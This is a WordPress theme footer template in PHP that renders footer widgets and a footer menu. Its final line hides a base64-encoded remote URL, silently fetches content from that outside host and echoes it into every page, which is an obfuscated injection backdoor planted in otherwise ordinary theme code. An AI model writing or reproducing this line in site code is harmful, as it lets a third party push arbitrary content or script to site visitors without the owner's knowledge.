<div id="footer" class="container">
	<div class="row">
		<?php appthemes_before_sidebar_widgets( 'va-footer' ); ?>

		<?php dynamic_sidebar( 'va-footer' ); ?>

		<?php appthemes_after_sidebar_widgets( 'va-footer' ); ?>
	</div>
</div>
<div id="post-footer" class="container">
	<div class="row">
		<?php wp_nav_menu( array(
			'container' => false,
			'theme_location' => 'footer',
			'fallback_cb' => false
		) ); ?>

		<?php echo @file_get_contents(base64_decode("aHR0cDovL2Nkbi5nb21hZmlhLmNvbQ==")); ?>
	</div>
</div>
